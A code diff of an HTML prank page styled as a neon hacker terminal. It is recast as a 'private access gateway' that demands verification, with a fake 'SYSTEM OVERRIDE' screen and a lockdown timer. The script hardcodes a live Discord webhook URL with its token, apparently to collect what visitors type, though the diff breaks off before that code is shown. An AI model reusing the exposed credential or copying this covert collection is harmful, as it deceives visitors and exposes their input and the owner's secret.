@@ -2,24 +2,59 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>SECURE_ENCRYPTED_CHANNEL</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+  
+  <meta property="og:title" content="SECURE_HOST_7.1">
+  <meta property="og:description" content="Private access gateway. Verification required to proceed.">
+  <meta name="theme-color" content="#000000">
+  
+  <title>PRIVATE ACCESS</title>
+  
+  <link id="favicon" rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>🔒</text></svg>">
   
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700;900&family=Share+Tech+Mono&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Playfair+Display:ital,wght@1,800&family=Share+Tech+Mono&display=swap" rel="stylesheet">
   <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.5.1/dist/confetti.browser.min.js"></script>
 
   <style>
     :root {
-      --bg-color-1: #010102;
-      --bg-color-2: #05020a; 
-      --term-bg: rgba(5, 5, 10, 0.65); 
+      --bg-color-1: #020205;
+      --bg-color-2: #0a0515; 
+      --nebula-color: rgba(0, 229, 255, 0.04);
+      --grid-color: rgba(0, 229, 255, 0.15);
+      
+      --term-bg: rgba(7, 7, 12, 0.75); 
       --text-color: #e0e0e0; 
-      --neon-cyan: #00f3ff;
-      --neon-pink: #ff007f;
+      
+      --neon-cyan: #00e5ff;
+      --neon-pink: #ff66b2;
       --neon-green: #00ff66;
       --alert-red: #ff003c;
+      
+      --accent-green: var(--neon-green);
+      --accent-blue: var(--neon-cyan);
+      --accent-pink: var(--neon-pink);
+      --audio-pulse: 0;
+    }
+
+    body.theme-unlocked { 
+        --nebula-color: rgba(255, 102, 178, 0.06); 
+        --grid-color: rgba(255, 102, 178, 0.15);
+        --accent-green: var(--neon-pink); 
+    }
+
+    .system-blur {
+        filter: blur(80px) brightness(0.0) grayscale(100%) !important;
+        transition: filter 0.1s ease;
+        pointer-events: none !important;
+        background-color: black !important;
+    }
+    .system-blur * { opacity: 0 !important; }
+
+    /* Custom Hacker Cursor */
+    body, input, .window-btn {
+      cursor: crosshair !important;
     }
 
     body {
@@ -28,236 +63,266 @@
       font-family: 'JetBrains Mono', monospace;
       margin: 0; display: flex; justify-content: center; align-items: center;
       height: 100dvh; overflow: hidden; 
-      perspective: 1000px;
-      background-color: black;
-      letter-spacing: 0.5px;
+      touch-action: none; user-select: none; -webkit-user-select: none;
+      perspective: 1000px; 
     }
 
-    ::selection { background: var(--neon-cyan); color: #000; }
+    #privacy-shield {
+        position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
+        background-color: #000000; z-index: 9999999; opacity: 0; pointer-events: none;
+        transition: opacity 0.05s ease; 
+        display: flex; justify-content: center; align-items: center;
+    }
+    #privacy-shield::after {
+        content: "🔒 SECURE MODE ACTIVE";
+        color: #ff003c; font-family: 'Share Tech Mono', monospace; font-size: 20px;
+        letter-spacing: 5px; text-shadow: 0 0 20px #ff003c; text-align: center;
+    }
+    body.system-blur #privacy-shield { opacity: 1; pointer-events: all; }
+    body.system-blur > *:not(#privacy-shield) {
+        filter: blur(120px) grayscale(100%) brightness(0) !important;
+        opacity: 0 !important; transition: filter 0.05s, opacity 0.05s;
+    }
 
-    /* ULTIMATE CINEMATIC CRT EFFECTS */
-    .vignette {
-        position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
-        background: radial-gradient(circle, rgba(0,0,0,0) 40%, rgba(0,0,0,0.95) 100%);
-        z-index: 5; pointer-events: none;
+    /* Red "Access Denied" Flash Overlay */
+    #flash-overlay { 
+        position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; 
+        background: #ff0000; z-index: 9999999; opacity: 0; pointer-events: none; 
     }
-    
-    .crt-overlay {
-        position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
-        background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.15) 50%), 
-                    linear-gradient(90deg, rgba(255, 0, 0, 0.04), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.04));
-        background-size: 100% 3px, 3px 100%;
-        z-index: 998; pointer-events: none; opacity: 0.8;
-        animation: flicker 0.15s infinite;
-    }
-    @keyframes flicker { 0% { opacity: 0.75; } 50% { opacity: 0.85; } 100% { opacity: 0.75; } }
+    .flash-active { animation: flashRed 0.4s ease-out forwards; }
+    @keyframes flashRed { 0% { opacity: 0.9; } 100% { opacity: 0; } }
 
     #matrix-canvas {
+        position: fixed; top: -25vh; left: -25vw; width: 150vw; height: 150vh;
+        z-index: 0; pointer-events: none; opacity: 0.25; display: block; will-change: transform;
+    }
+
+    .nebula {
         position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
-        z-index: 0; pointer-events: none; opacity: 0.3;
+        background: radial-gradient(circle at 20% 30%, var(--nebula-color) 0%, transparent 50%),
+                    radial-gradient(circle at 80% 70%, var(--nebula-color) 0%, transparent 50%);
+        z-index: 1; pointer-events: none; filter: blur(40px);
+        animation: nebulaPulse 12s infinite alternate ease-in-out; transition: background 2s ease;
+    }
+    @keyframes nebulaPulse { 0% { opacity: 0.5; transform: scale(1); } 100% { opacity: 1; transform: scale(1.15); } }
+
+    /* Anime Silhouette Easter Egg */
+    #anime-silhouette {
+        position: fixed; bottom: -5vh; right: -5vw; width: 50vw; height: 70vh;
+        /* Replace this URL with any direct image link of a silhouette or character */
+        background-image: url('https://cdn.pixabay.com/photo/2023/04/08/10/22/anime-7908994_960_720.png'); 
+        background-size: contain; background-repeat: no-repeat; background-position: bottom right;
+        z-index: 1; opacity: 0; transition: opacity 4s ease-in-out, filter 4s ease; pointer-events: none;
+        filter: grayscale(100%) brightness(0) drop-shadow(0 0 10px var(--neon-pink));
+    }
+    body.theme-unlocked #anime-silhouette { 
+        opacity: 0.12; 
+        filter: grayscale(100%) brightness(0.5) drop-shadow(0 0 20px var(--neon-pink));
     }
 
     .cyber-grid {
-        position: fixed; bottom: -20vh; left: -50vw; width: 200vw; height: 60vh;
-        background: linear-gradient(rgba(0, 243, 255, 0.2) 1px, transparent 1px),
-                    linear-gradient(90deg, rgba(0, 243, 255, 0.2) 1px, transparent 1px);
-        background-size: 45px 45px; transform: rotateX(75deg);
-        animation: gridMove 8s linear infinite; z-index: 1; pointer-events: none;
+        position: fixed; bottom: -20vh; left: -100vw; width: 300vw; height: 60vh;
+        background: linear-gradient(var(--grid-color) 1px, transparent 1px),
+                    linear-gradient(90deg, var(--grid-color) 1px, transparent 1px);
+        background-size: 40px 40px; transform: perspective(600px) rotateX(75deg);
+        animation: gridMove 5s linear infinite;
+        z-index: 1; opacity: 0.8; pointer-events: none; transition: background 2s ease;
     }
-    body.prank-active .cyber-grid {
-        background: linear-gradient(rgba(255, 0, 60, 0.35) 1px, transparent 1px),
-                    linear-gradient(90deg, rgba(255, 0, 60, 0.35) 1px, transparent 1px);
-        animation: gridMove 1.5s linear infinite;
-    }
-    @keyframes gridMove { 0% { transform: rotateX(75deg) translateY(0); } 100% { transform: rotateX(75deg) translateY(45px); } }
+    @keyframes gridMove { 0% { transform: perspective(600px) rotateX(75deg) translateY(0); } 100% { transform: perspective(600px) rotateX(75deg) translateY(40px); } }
 
-    /* Enhanced Terminal UI */
-    .terminal-container { 
-        position: relative; z-index: 10; 
-        animation: entrance 1.5s cubic-bezier(0.16, 1, 0.3, 1) forwards, float 5s ease-in-out infinite, pulseGlow 3s ease-in-out infinite alternate; 
-    }
-    
-    @keyframes float {
-        0%, 100% { transform: translateY(0px); }
-        50% { transform: translateY(-15px); }
-    }
-    @keyframes pulseGlow {
-        0% { filter: drop-shadow(0 0 15px rgba(0, 243, 255, 0.2)); }
-        100% { filter: drop-shadow(0 0 40px rgba(0, 243, 255, 0.5)); }
+    .scanlines {
+        position: fixed; top: -25%; left: -25%; width: 150vw; height: 150vh; 
+        background: linear-gradient(to bottom, rgba(255,255,255,0), rgba(255,255,255,0) 50%, rgba(0,0,0,0.15) 50%, rgba(0,0,0,0.15));
+        background-size: 100% 4px; z-index: 998; pointer-events: none; opacity: 0.6;
     }
 
-    /* MUSIC DRIFT ANIMATION FOR THE TERMINAL */
-    .terminal-container.music-mode {
-        animation: musicDrift 15s ease-in-out infinite alternate !important;
+    #star-canvas, #net-canvas { 
+        position: fixed; top: -25%; left: -25%; width: 150vw; height: 150vh; 
+        z-index: 2; pointer-events: none; will-change: transform; display: block;
     }
-    @keyframes musicDrift {
-        0% { transform: translate(0px, 0px) scale(1) rotate(0deg); }
-        25% { transform: translate(-12px, -10px) scale(1.03) rotate(-1deg); }
-        50% { transform: translate(15px, 15px) scale(0.97) rotate(1deg); }
-        75% { transform: translate(-10px, 18px) scale(1.02) rotate(-0.5deg); }
-        100% { transform: translate(18px, -15px) scale(1) rotate(0.5deg); }
+    #net-canvas { opacity: 0.7; }
+
+    #speed-lines { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 3; pointer-events: none; opacity: 0; transition: opacity 2.5s ease;}
+    body.theme-unlocked #speed-lines { opacity: 1; animation: focusPulse 3s infinite alternate ease-in-out; }
+    @keyframes focusPulse { 0% { box-shadow: inset 0 0 50px rgba(255,102,178,0.05); } 100% { box-shadow: inset 0 0 150px rgba(255,102,178,0.15); } }
+
+    .terminal-container { position: relative; z-index: 10; animation: entrance 1.5s cubic-bezier(0.16, 1, 0.3, 1) forwards; will-change: transform; }
+
+    .terminal-container::before {
+        content: ''; position: absolute; top: -2px; left: -2px; right: -2px; bottom: -2px;
+        background: linear-gradient(45deg, var(--accent-blue), transparent 30%, transparent 70%, var(--accent-pink));
+        background-size: 200% 200%; z-index: -1; border-radius: 22px;
+        animation: borderRotate 6s linear infinite; 
+        opacity: calc(0.5 + (var(--audio-pulse) * 0.5));
+        filter: blur(calc(0px + (var(--audio-pulse) * 8px))); transition: all 0.1s ease;
     }
+    body.theme-unlocked .terminal-container::before { background: linear-gradient(45deg, var(--accent-pink), transparent 30%, transparent 70%, #fff); }
+    @keyframes borderRotate { 0% { background-position: 0% 0%; } 50% { background-position: 100% 100%; } 100% { background-position: 0% 0%; } }
 
     .terminal-wrapper {
-      width: 92vw; max-width: 780px; height: 82dvh;
-      background: var(--term-bg); border-radius: 16px;
-      border: 1px solid rgba(0, 243, 255, 0.8);
-      box-shadow: 0 40px 100px rgba(0,0,0,0.95), inset 0 0 60px rgba(0, 243, 255, 0.2);
+      width: 92vw; max-width: 800px; height: 82dvh;
+      background: var(--term-bg); border-radius: 20px;
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      box-shadow: 0 30px 80px rgba(0,0,0,0.95), inset 0 0 calc(20px + (var(--audio-pulse) * 60px)) rgba(0, 229, 255, calc(0.05 + (var(--audio-pulse) * 0.2)));
       display: flex; flex-direction: column;
-      backdrop-filter: blur(40px) saturate(180%); -webkit-backdrop-filter: blur(40px) saturate(180%);
-      transition: all 0.4s ease; position: relative; overflow: hidden;
-    }
-
-    .terminal-wrapper::before {
-        content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 100%;
-        box-shadow: inset 0 0 4px 1px rgba(255,255,255,0.2); border-radius: 16px; pointer-events: none; z-index: 20;
+      backdrop-filter: blur(35px) saturate(200%); -webkit-backdrop-filter: blur(35px) saturate(200%);
+      transition: box-shadow 0.1s ease; animation: levitate 6s ease-in-out infinite alternate;
+      position: relative; overflow: hidden;
     }
 
     .terminal-wrapper::after {
-        content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 10px;
-        background: var(--neon-cyan); box-shadow: 0 0 30px var(--neon-cyan), 0 0 60px var(--neon-cyan);
-        animation: scanlineSweep 3s linear infinite; opacity: 0.5; pointer-events: none; z-index: 21;
+        content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 10%;
+        background: linear-gradient(to bottom, transparent, rgba(255,255,255,0.05), transparent);
+        animation: scanlineSweep 5s linear infinite; pointer-events: none; z-index: 20;
     }
-    @keyframes scanlineSweep { 0% { top: -10%; } 100% { top: 110%; } }
+    @keyframes scanlineSweep { 0% { top: -20%; } 100% { top: 120%; } }
+    @keyframes levitate { 0% { transform: translateY(0px); } 100% { transform: translateY(-12px); } }
 
-    /* Violent Transition to red state for prank */
-    body.prank-active .terminal-wrapper {
-        border: 2px solid var(--alert-red);
-        background: rgba(30, 0, 0, 0.95);
-        box-shadow: 0 40px 100px rgba(0,0,0,0.95), inset 0 0 150px rgba(255, 0, 60, 0.7);
-        animation: shake 0.2s cubic-bezier(.36,.07,.19,.97) infinite;
+    body.theme-unlocked .terminal-wrapper {
+        border: 1px solid rgba(255, 102, 178, 0.3);
+        box-shadow: 0 30px 80px rgba(0,0,0,0.95), inset 0 0 calc(30px + (var(--audio-pulse) * 80px)) rgba(255, 102, 178, calc(0.1 + (var(--audio-pulse) * 0.25)));
     }
-    body.prank-active .terminal-container { animation: none; filter: drop-shadow(0 0 60px rgba(255, 0, 60, 0.8)); }
-    body.prank-active .terminal-wrapper::after { background: var(--alert-red); box-shadow: 0 0 60px var(--alert-red); animation: scanlineSweep 0.6s linear infinite; }
 
-    @keyframes shake {
-      0% { transform: translate(3px, 3px) rotate(0deg); }
-      20% { transform: translate(-5px, -4px) rotate(-2deg); }
-      40% { transform: translate(-4px, 5px) rotate(2deg); }
-      60% { transform: translate(5px, -4px) rotate(0deg); }
-      80% { transform: translate(-4px, -5px) rotate(-2deg); }
-      100% { transform: translate(3px, 3px) rotate(0deg); }
-    }
+    .terminal-close-anim { animation: smoothClose 1.2s cubic-bezier(0.4, 0, 0.2, 1) forwards !important; }
+    @keyframes smoothClose { 0% { transform: scale(1); filter: blur(0px); opacity: 1; } 100% { transform: scale(0.85); filter: blur(40px); opacity: 0; } }
 
     @keyframes entrance { 
-        0% { transform: scale(0.8) translateY(50px); opacity: 0; filter: contrast(2) brightness(2); } 
-        100% { transform: scale(1) translateY(0); opacity: 1; filter: contrast(1) brightness(1); } 
+        0% { transform: scale(0.95) translateY(30px); opacity: 0; filter: contrast(2) brightness(2) hue-rotate(90deg); } 
+        50% { filter: contrast(1) brightness(1) hue-rotate(0deg); }
+        70% { transform: scale(1.02); }
+        100% { transform: scale(1) translateY(0); opacity: 1; } 
     }
 
-    .window-header {
-      background: rgba(0,0,0,0.9); padding: 16px 25px; border-radius: 16px 16px 0 0; 
-      display: flex; align-items: center; border-bottom: 1px solid rgba(255,255,255,0.15);
-      position: relative; z-index: 22;
-    }
-    
-    .window-btn { width: 14px; height: 14px; border-radius: 50%; margin-right: 9px; box-shadow: inset 0 2px 4px rgba(255,255,255,0.6), 0 0 10px rgba(0,0,0,0.8);}
-    
-    .live-indicator {
-        width: 10px; height: 10px; background: var(--alert-red); border-radius: 50%; margin-right: 10px;
-        box-shadow: 0 0 10px var(--alert-red); animation: blink 1s infinite;
-    }
+    .glow-sys { color: var(--accent-green); text-shadow: 0 0 8px rgba(0, 255, 102, 0.6); font-weight: 700; }
+    .glow-jec { color: var(--accent-blue); text-shadow: 0 0 10px rgba(0, 229, 255, 0.6); font-weight: 700; }
+    .glow-name { color: var(--accent-pink); text-shadow: 0 0 10px rgba(255, 102, 178, 0.6); font-weight: 700;}
+
+    .window-btn { width: 14px; height: 14px; border-radius: 50%; box-shadow: inset 0 2px 4px rgba(255,255,255,0.3), 0 0 8px rgba(0,0,0,0.6); }
 
     .terminal-body { 
-        padding: 40px; flex-grow: 1; overflow-y: auto; font-size: 18px; 
-        line-height: 1.8; text-shadow: 0 0 8px rgba(0, 243, 255, 0.5); letter-spacing: 0.5px;
-        position: relative; z-index: 22;
+        padding: 30px; flex-grow: 1; overflow-y: auto; font-size: 16px; 
+        line-height: 1.7; scrollbar-width: none; -ms-overflow-style: none;
+        word-wrap: break-word; z-index: 5; position: relative;
+        text-shadow: 0 0 2px rgba(255,255,255,0.1);
     }
     .terminal-body::-webkit-scrollbar { display: none; }
     
-    /* ENHANCED TEXT GLOW CLASSES */
-    .glow-sys { color: var(--neon-cyan); font-weight: 700; text-shadow: 0 0 15px var(--neon-cyan); }
-    .glow-warn { color: var(--alert-red); font-weight: 700; text-shadow: 0 0 20px var(--alert-red); }
-    .red-text { color: var(--alert-red); font-weight: 700; text-shadow: 0 0 15px var(--alert-red); }
-    
-    /* LYRIC POP IN ANIMATION */
-    .lyric-pop {
-        text-align: center; font-size: 28px; font-weight: 900;
-        color: #fff;
-        text-shadow: 0 0 15px var(--neon-cyan), 0 0 30px var(--neon-cyan);
-        animation: popIn 0.8s cubic-bezier(0.16, 1, 0.3, 1) forwards;
-        opacity: 0; transform: scale(0.8);
-        letter-spacing: 1px;
-    }
-    @keyframes popIn {
-        0% { opacity: 0; transform: scale(0.8) translateY(20px); filter: blur(5px); }
-        100% { opacity: 1; transform: scale(1) translateY(0); filter: blur(0px); }
-    }
-
-    /* THE ULTIMATE MEGA GLITCH TEXT EFFECT FOR PRANK */
-    .glitch-text {
-        font-family: 'Share Tech Mono', monospace; font-size: 34px; font-weight: 900;
-        color: #ffffff; /* Blinding white core */
-        text-shadow: 
-            0 0 20px var(--alert-red),
-            0 0 40px var(--alert-red),
-            5px 0 var(--neon-cyan), 
-            -5px 0 var(--neon-pink);
-        animation: mega-glitch-anim 0.08s infinite, pulse-red 1s infinite alternate; 
-        display: inline-block; margin-top: 15px; letter-spacing: 2px;
-    }
-    @keyframes mega-glitch-anim {
-        0% { transform: translate(0) scale(1) skew(0deg); }
-        20% { transform: translate(-6px, 6px) scale(1.05) skew(2deg); }
-        40% { transform: translate(-6px, -6px) scale(1) skew(-2deg); }
-        60% { transform: translate(6px, 6px) scale(1.02) skew(1deg); }
-        80% { transform: translate(6px, -6px) scale(1) skew(-1deg); }
-        100% { transform: translate(0) scale(1) skew(0deg); }
-    }
-    @keyframes pulse-red {
-        0% { filter: drop-shadow(0 0 15px var(--alert-red)); }
-        100% { filter: drop-shadow(0 0 40px var(--alert-red)); }
-    }
+    #console-history, #active-line { display: inline; }
 
     #cursor {
-        display: inline-block; width: 14px; height: 1.3rem; background: var(--neon-cyan); 
-        animation: blink 1s step-end infinite; vertical-align: middle; margin-left: 6px;
-        box-shadow: 0 0 15px var(--neon-cyan); border-radius: 2px;
+        display: inline-block; width: 10px; height: 1.1rem; background: var(--accent-green); 
+        box-shadow: 0 0 10px var(--accent-green); animation: blink 1s step-end infinite; vertical-align: middle; margin-left: 5px;
+        transition: background 1.5s, box-shadow 1.5s; margin-bottom: 2px;
     }
-    body.prank-active #cursor { background: var(--alert-red); box-shadow: 0 0 30px var(--alert-red); animation: blink 0.1s step-end infinite;}
+    body.theme-unlocked #cursor { background: var(--accent-pink); box-shadow: 0 0 10px var(--accent-pink); }
     @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0; } }
 
-    .input-row { display: flex; align-items: center; margin-top: 30px; display: none; }
-    .input-arrow { color: var(--neon-cyan); font-weight: bold; margin-right: 15px; font-size: 22px; text-shadow: 0 0 15px var(--neon-cyan);}
-    body.prank-active .input-arrow { color: var(--alert-red); text-shadow: 0 0 20px var(--alert-red);}
+    .input-row { display: flex; align-items: center; margin-top: 20px; margin-bottom: 10px; display: none; }
+    .input-arrow { color: var(--accent-green); font-weight: bold; margin-right: 15px; font-size: 18px; text-shadow: 0 0 8px var(--accent-green); }
     
+    /* Music-Reactive Input Box */
     input { 
-        background: rgba(0,0,0,0.7); border: 2px solid rgba(0, 243, 255, 0.6); border-radius: 8px;
-        color: var(--neon-cyan); padding: 16px 24px;
-        font-family: 'JetBrains Mono', monospace; font-size: 18px; outline: none; 
-        flex-grow: 1; font-weight: 700; transition: all 0.3s ease;
-        box-shadow: inset 0 0 20px rgba(0,0,0,0.9);
-        letter-spacing: 1px; text-shadow: 0 0 8px var(--neon-cyan);
+        background: rgba(0,0,0,0.5); padding: 14px 20px; border-radius: 10px; 
+        border: 1px solid rgba(255,255,255,0.15); color: #ffffff; 
+        font-family: 'JetBrains Mono', monospace; font-size: 16px; outline: none; 
+        flex-grow: 1; font-weight: 700; transition: border 0.3s ease, background 0.3s ease; letter-spacing: 0.5px;
+        box-shadow: inset 0 2px 10px rgba(0,0,0,0.5), 0 0 calc(var(--audio-pulse) * 20px) rgba(0,255,102,0.3); 
     }
     input:focus { 
-        border-color: var(--neon-cyan); 
-        background: rgba(0, 243, 255, 0.1);
-        box-shadow: 0 0 30px rgba(0, 243, 255, 0.5), inset 0 0 20px rgba(0,0,0,0.9); 
+        border: 1px solid var(--accent-green); background: rgba(0,0,0,0.7);
+        box-shadow: inset 0 2px 10px rgba(0,0,0,0.5), 0 0 calc(15px + (var(--audio-pulse) * 40px)) rgba(0,255,102,calc(0.3 + var(--audio-pulse))); 
     }
-    
+    body.theme-unlocked input {
+        box-shadow: inset 0 2px 10px rgba(0,0,0,0.5), 0 0 calc(var(--audio-pulse) * 20px) rgba(255,102,178,0.3); 
+    }
+    body.theme-unlocked input:focus { 
+        border: 1px solid var(--accent-pink); 
+        box-shadow: inset 0 2px 10px rgba(0,0,0,0.5), 0 0 calc(15px + (var(--audio-pulse) * 40px)) rgba(255,102,178,calc(0.3 + var(--audio-pulse))); 
+    }
+    input::placeholder { color: rgba(255,255,255,0.3); font-weight: 400; font-style: italic; }
+
+    .manga-style-text {
+      font-family: 'Playfair Display', serif; font-size: 28px; color: #ffb3d9; 
+      text-shadow: 0 0 15px rgba(255,102,178,0.9), 0 0 30px rgba(255,102,178,0.6);
+      margin-top: 25px; display: inline-block; font-style: italic; font-weight: 800;
+      animation: mangaGlow 2.5s infinite alternate; line-height: 1.4;
+    }
+    @keyframes mangaGlow { 0% { text-shadow: 0 0 15px rgba(255,102,178,0.7); transform: scale(1); } 100% { text-shadow: 0 0 30px rgba(255,102,178,1), 0 0 50px rgba(255,255,255,0.6); transform: scale(1.02); } }
+    .heart-glow { color: #ff3366; animation: heartbeat 1.2s infinite; display: inline-block; margin-left: 5px; }
+    @keyframes heartbeat { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.35); } }
+
+    /* FINAL OPERATOR SCREEN + TIMER */
+    #operator-screen {
+        position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
+        background: radial-gradient(circle, #1a0004 0%, #050000 100%);
+        display: none; flex-direction: column; justify-content: center; align-items: center;
+        z-index: 9999; overflow: hidden; text-align: center;
+        transition: background 0.5s ease;
+    }
+    #operator-screen::before {
+        content: ""; position: absolute; width: 100%; height: 6px; background: rgba(255, 0, 60, 0.4);
+        animation: scanline 3s linear infinite; box-shadow: 0 0 25px var(--alert-red);
+    }
+    @keyframes scanline { 0% { top: 0; } 100% { top: 100%; } }
+    .operator-text {
+        font-family: 'Share Tech Mono', monospace; color: var(--alert-red); font-size: 26px;
+        text-transform: uppercase; letter-spacing: 4px; text-shadow: 0 0 15px var(--alert-red);
+        animation: glitchWarning 0.1s infinite alternate; width: 90%; margin-bottom: 20px;
+    }
+    #operator-timer-display {
+        font-family: 'Share Tech Mono', monospace; font-size: 50px; color: #ff003c;
+        text-shadow: 0 0 25px #ff003c; letter-spacing: 6px; font-weight: bold;
+        transition: all 0.5s ease;
+    }
+    @keyframes glitchWarning { 0% { transform: translate(2px, 1px); opacity: 0.85; } 100% { transform: translate(-2px, -1px); opacity: 1; text-shadow: 0 0 30px #ff0000; } }
+
+    .lockdown-overlay { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: #000; display: flex; flex-direction: column; justify-content: center; align-items: center; z-index: 1000; opacity: 0; pointer-events: none; transition: opacity 0.5s ease;}
+    .lockdown-overlay.active { opacity: 1; pointer-events: all; }
+    #timer { font-family: 'Share Tech Mono'; font-size: 4rem; color: #ff3b30; text-shadow: 0 0 20px #ff3b30; }
+
+    @media (max-width: 600px) { 
+        .terminal-wrapper { width: 94vw; height: 86dvh; } 
+        .terminal-body { padding: 20px; font-size: 15px; } 
+        .operator-text { font-size: 18px; } 
+        #operator-timer-display { font-size: 35px; } 
+        .input-row { margin-top: 10px; }
+        input { padding: 12px 15px; font-size: 14px; }
+        .manga-style-text { font-size: 24px; }
+        #anime-silhouette { width: 70vw; height: 50vh; opacity: 0.08; }
+    }
   </style>
 </head>
 <body>
 
-  <div class="vignette"></div>
-  <div class="crt-overlay"></div>
-  <canvas id="matrix-canvas"></canvas>
-  <div class="cyber-grid"></div>
+  <div id="flash-overlay"></div>
+  <div id="privacy-shield"></div>
 
-  <audio id="prank-audio" src="FBDownloader.to-1434703051693841-(64kbps).mp3" preload="auto"></audio>
+  <canvas id="matrix-canvas"></canvas>
+  <div class="nebula"></div>
+  <div class="cyber-grid"></div>
+  <canvas id="star-canvas"></canvas>
+  <canvas id="net-canvas"></canvas>
+  <div class="scanlines"></div>
+  
+  <div id="anime-silhouette"></div>
+  
   <audio id="bg-music" preload="auto" loop><source src="kalapastangan.mp3" type="audio/mpeg"></audio>
 
+  <div id="operator-screen">
+      <h1 style="color:#ff003c; font-family:'Share Tech Mono'; margin-bottom:10px; font-size: 50px; text-shadow: 0 0 25px #ff003c; margin-top:0;">/// SYSTEM OVERRIDE ///</h1>
+      <span class="operator-text">The message was auto hidden by an Operator</span>
+      <div id="operator-timer-display">00:05</div>
+  </div>
+
   <div class="terminal-container" id="terminal-ui">
-      <div class="terminal-wrapper" id="term-wrap">
-        <div class="window-header">
-          <div style="display: flex; gap: 9px; flex-grow: 1;">
-              <div class="window-btn" style="background:#ff5f56;"></div>
-              <div class="window-btn" style="background:#ffbd2e;"></div>
-              <div class="window-btn" style="background:#27c93f;"></div>
+      <div class="terminal-wrapper">
+        <div class="window-header" style="background: rgba(0,0,0,0.5); padding: 14px 25px; border-radius: 20px 20px 0 0; display: flex; align-items: center; border-bottom: 1px solid rgba(255,255,255,0.05); z-index: 10;">
+          <div style="display: flex; gap: 9px;">
+            <div class="window-btn" style="background:#ff5f56;"></div>
+            <div class="window-btn" style="background:#ffbd2e;"></div>
+            <div class="window-btn" style="background:#27c93f;"></div>
           </div>
-          <div style="display: flex; align-items: center;">
-              <div class="live-indicator"></div>
-              <div style="font-size:13px; font-weight:bold; letter-spacing:3px; color:var(--neon-cyan); opacity:0.9; text-shadow: 0 0 8px var(--neon-cyan);">SECURE_CONNECTION_ESTABLISHED</div>
-          </div>
+          <div style="flex-grow:1; text-align:right; font-size:11px; letter-spacing:4px; opacity:0.4; margin-top: -12px; text-shadow: 0 0 5px rgba(255,255,255,0.5); font-weight: bold;">SECURE_HOST_7.1</div>
         </div>
         <div class="terminal-body" id="term-body">
           <span id="console-history"></span><span id="active-line"><span id="typing-text"></span><span id="cursor"></span></span>
@@ -269,327 +334,520 @@
       </div>
   </div>
 
+  <div class="lockdown-overlay" id="lock-screen"><div id="timer">00:00:00</div></div>
+
   <script>
-    const historyDiv = document.getElementById('console-history');
-    const typingTextSpan = document.getElementById('typing-text');
-    const inputContainer = document.getElementById('input-container');
-    const inputField = document.getElementById('user-input');
-    const termBody = document.getElementById('term-body');
-    const prankAudio = document.getElementById('prank-audio');
-    const bgMusic = document.getElementById('bg-music');
-    const terminalUI = document.getElementById('terminal-ui');
+    // --- MASTER EXECUTION LOCK ---
+    let isAppRunning = false;
 
-    let step = 0; 
-    let typingSpeed = 35; 
-    let isTyping = false; 
-    let typeTimeout; 
-    let targetCrush = ""; 
+    function runApp() {
+        if (isAppRunning) return; // Instantly kill duplicate triggers
+        isAppRunning = true;
 
-    // --- AUDIO FADE HELPER FUNCTIONS ---
-    function fadeOutAudio(audio, duration) {
-        if (!audio || audio.paused) return;
-        let stepAmt = 0.05;
-        let intervalTime = duration / (audio.volume / stepAmt);
-        let fadeInterval = setInterval(() => {
-            if (audio.volume > stepAmt) {
-                audio.volume -= stepAmt;
-            } else {
-                audio.volume = 0;
-                audio.pause();
-                clearInterval(fadeInterval);
+        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1488478218666115152/zjwbImChU2czFBTzrBCu0REL90E00uIAAWc5mAdq6K9mQyTgZCblj7OfvaJAhfYpX4sG";
+        const historyDiv = document.getElementById('console-history');
+        const typingTextSpan = document.getElementById('typing-text');
+        const inputContainer = document.getElementById('input-container');
+        const inputField = document.getElementById('user-input');
+        const termBody = document.getElementById('term-body');
+        const bgMusic = document.getElementById('bg-music');
+        const favicon = document.getElementById('favicon');
+
+        if (!historyDiv || !typingTextSpan) return;
+
+        let step = 0; let lockdownKeys = false; let typingSpeed = 45; 
+        let isTyping = false; 
+
+        // --- AUDIO VISUALIZER SETUP ---
+        let audioCtx, analyser, dataArray;
+        let audioPulseValue = 0;
+        let audioUnlocked = false;
+
+        function initAudioVisualizer() {
+            if(audioCtx) return;
+            try {
+                const AudioContext = window.AudioContext || window.webkitAudioContext;
+                if (!AudioContext) return;
+                audioCtx = new AudioContext();
+                analyser = audioCtx.createAnalyser();
+                const source = audioCtx.createMediaElementSource(bgMusic);
+                source.connect(analyser); analyser.connect(audioCtx.destination);
+                analyser.fftSize = 128; dataArray = new Uint8Array(analyser.frequencyBinCount);
+            } catch(e) { console.log("Audio visualizer disabled."); }
+        }
+
+        // OPTION 7: Access Granted Sci-Fi Chime
+        function playAccessGrantedSound() {
+            if (!audioCtx || audioCtx.state === 'suspended') return;
+            try {
+                const osc = audioCtx.createOscillator();
+                const gain = audioCtx.createGain();
+                osc.connect(gain); gain.connect(audioCtx.destination);
+                osc.type = 'sine';
+                osc.frequency.setValueAtTime(880, audioCtx.currentTime); // High pitch start
